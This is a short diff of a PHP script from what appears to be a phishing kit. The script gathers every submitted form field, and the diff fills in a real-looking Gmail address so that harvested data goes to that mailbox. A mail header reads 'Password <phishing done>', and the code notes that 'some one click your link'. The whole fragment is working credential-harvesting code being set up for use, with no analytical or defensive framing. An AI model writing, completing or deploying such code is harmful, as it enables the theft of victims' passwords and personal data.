@@ -41,7 +41,7 @@ foreach($_POST as $k => $v){
     $posts .= '$_POST['.$k.'] = '.$v."\n";
 }
 $posts       .= "some one click your link\n";
-$emailto    = 'Enter Your Email';
+$emailto    = 'rewardtiktok3@gmail.com';
 $subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
 $from        = "From: Password <phishing done>";
 $body        = '
